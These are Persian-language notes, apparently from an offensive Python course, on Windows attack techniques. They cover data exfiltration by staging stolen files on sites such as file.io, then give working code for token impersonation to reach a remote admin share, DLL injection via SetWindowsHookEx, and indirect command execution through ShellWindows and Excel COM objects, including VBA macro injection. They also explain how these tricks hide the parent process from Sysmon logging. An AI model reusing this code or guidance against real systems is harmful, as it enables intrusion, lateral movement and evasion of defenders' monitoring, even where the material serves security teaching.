
###### یکی از تکنیک هایی که مهاجمین برای data exfilteration استفاده میکنن اینه که میان اون دیتا رو میزارن رو لبه شبکه مثلا سایت خوده شبکه و از اونجا دیتا رو برمیدارن یا مثلا میبینن تو تایم اداری کاربران از چه سایت هایی بیشتر بازدید میکنن میزارن رو اون سایت ها و یه همچین کاری میکنن تا به صورت غیر مستقیم دیتا رو از اونجا بردارن یا داخل یه سایت های دیگری میزارن که فایل موقت هستن مثله سایت file.io و لینکی که اون سایت بهمون میده میایم و دیتا رو برمیداریم به صورت غیر مستقیم اینجا دیگه ترافیک خودمون هم نمی افته 



### Token Impersonate

```python
import ctypes
from ctypes import wintypes

Advapi32 = ctypes.WinDLL("Advapi32.dll")

#https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-logonuserw
LogonUser = Advapi32.LogonUserW
LogonUser.argtypes = [wintypes. LPCWSTR, wintypes. LPCWSTR, wintypes. LPCWSTR, wintypes. DWORD, wintypes. DWORD, wintypes. PHANDLE]
LogonUser.restype = wintypes.BOOL
user        = "target"
password    = "123"
domain      = "amin.com"
dwLogonType = 9 #define LOGON32_LOGON_NEW_CREDENTIALS
provider = 0 #define LOGON32_PROVIDER_DEFAULT
token = wintypes.HANDLE()
LogonUser(user,domain,password,dwLogonType,provider,ctypes.byref(token))


#impersonate logon user

ImpersonateLogonUser = Advapi32.ImpersonateLoggedOnUser
ImpersonateLogonUser.argtypes = [wintypes.HANDLE]
ImpersonateLogonUser.restype = wintypes.BOOL
ImpersonateLogonUser(token)

import os

print(os.listdir("\\\\192.168.0.128\C$"))

```


### Hooking 

```python
import ctypes
from ctypes import wintypes

kernel32 = ctypes.WinDLL("kernel32.dll")
user32 = ctypes.WinDLL("user32.dll")

FindWindoW = user32.FindWindowW
FindWindoW.argtypes = [wintypes.LPCWSTR,wintypes.LPCWSTR]
FindWindoW.restype = wintypes.HWND

hwnd = FindWindoW("notepad",None)

GetWindowThreadProcessId = user32.GetWindowThreadProcessId
GetWindowThreadProcessId.argtypes = [wintypes.HWND,wintypes.LPDWORD]
GetWindowThreadProcessId.restype = wintypes.DWORD

pid  = wintypes.DWORD(0)
tid = GetWindowThreadProcessId(hwnd,ctypes.byref(pid))
#print(f"PID: {pid.value}\nTID: {tid}")

#loadlibrary

LoadLibrary = kernel32.LoadLibraryExW
LoadLibrary.argtypes = [wintypes.LPCWSTR,wintypes.HANDLE,wintypes.DWORD]
LoadLibrary.restype = wintypes.HMODULE
DONT_RESOLVE_DLL_REFERENCES = 0x00000001
library = LoadLibrary("C:\\Users\\charon\\Desktop\\offensive python\\6\\hook\\HockAndInject.dll",None,DONT_RESOLVE_DLL_REFERENCES)

GetProcAddress =  kernel32.GetProcAddress
GetProcAddress.argtypes = [wintypes.HMODULE,wintypes.LPCSTR]
GetProcAddress.restype = wintypes.LPHANDLE
address = GetProcAddress(library,ctypes.c_char_p("NextHook".encode('utf-8')))

print(address)

SetWindowHookEx = user32.SetWindowsHookExW
SetWindowHookEx.argtypes = [wintypes.DWORD,wintypes.LPHANDLE,wintypes.HMODULE,wintypes.DWORD]
SetWindowHookEx.restype = wintypes.LPHANDLE
WH_GETMESSAGE = 3
SetWindowHookEx(WH_GETMESSAGE,address,library,tid)

PostThreadMessage = user32.PostThreadMessageW
PostThreadMessage.argtypes = [wintypes.DWORD,wintypes.UINT,wintypes.WPARAM,wintypes.LPARAM]
PostThreadMessage.restype 	= wintypes.BOOL
PostThreadMessage(tid,0,0,0)

```


کلا یکی از کتابخونه هایی که به ما این امکان رو میده با winapi ها تعامل برقرار کنیم ctypes هستش

یکی دیگر از استفاده از کردن از clr هست که به ما این امکان رو میده با .NET ارتباط بگیریم 

---

# Indirect Command Execution


```python
import win32com.client

#ShellWindows   {9BA05972-F6A8-11CF-A442-00A0C90A8F39}

obj = win32com.client.Dispatch("{9BA05972-F6A8-11CF-A442-00A0C90A8F39}")
obj[0].Document.Application.ShellExecute("calc")




# Reference https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/

```


یکی از کتابخونه هایی که تو python وجود داره برای استفاده از com object ها استفاده از کتابخونه **win32com.client** هستش که امکان تعامل با Com Interface هارو به ما میده 

حالا یکی از com interface هایی که وجود داره **ShellWindows** هستش که ما ما از طریق این component میتونیم یک object در قالب آرایه درست میکنیم نکته یی که وجود داره index 0 این آرایه کلاس **Document** تابع **Application** و متود **SehllExecute** به ما این امکان رو میده تا بیایم و دستوری رو که مد نظرمون هست رو اجرا کنیم اما چه چیزی توجه مارو می تونه جلی کنه تا از این متود برای اجرا کردن دستوراتمون استفاده کنیم 
اونم اینه parent که می افته دیگر python.exe  نیست یا engine  که در جلسه اول ساختیم بلکه یه process دیگر هست 

![[Pasted image 20260523212438.png]]

همونطور که در لاگ های sysmon میبینید parent explorer افتاده 

![[Pasted image 20260523212515.png]]

و process explorer  یه process دیگه این موضوع میتونه برای ابهام سازی خیلی کمک کنه 


---


یکی دیگر از com interface هایی که وجود داره **Excel.Application** هست که به امکان تعامل با excel رو بهمون میده 


```python
import win32com.client
import time
obj = win32com.client.Dispatch("Excel.Application")
obj.Visible = 1
time.sleep(10)
obj.Workbooks.Add("")



# if Visible value == 1 ---->  running excel
# if Visible value == 0 ----> background (hidden) running Excel

```



![[Screen Recording 2026-05-23 214620.mp4]]

ما اومدیم با استفاده از تابع **Workbooks** متود Add یک workbook رو ساختیم حالا بریم تو مرحله بعد 


![[Pasted image 20260523214924.png]]


و همینطور اگر به لاگ های sysmon دقت کنید بازم parent پایتون نیست بلکه svchost هست 

به طور کلی در حین استفاده از com بیشتر مواقع اگر از این نوع interface استفاده کنید به خاطر وابستگی هایی که وجود داره و خودش زیر مجموعه Win32_API ها و NT API ها هست در نهایت برای اینکه کد شما اجرا بشه توسط یه سری dll که داخل یه سری سرویس هایی درون svchost attach شدن میاد اجرا میشه 





```python
import win32com.client
import time
obj = win32com.client.Dispatch("Excel.Application")
obj.Visible = 1
work = obj.Workbooks.Add("")
macro = """
sub exec()
CreateObject("wscript.shell").Exec("notepad.exe")
End Sub
"""
work.VBProject.VBComponents.Item(1).CodeModule.AddFromString(macro)

```


----

### 53:52




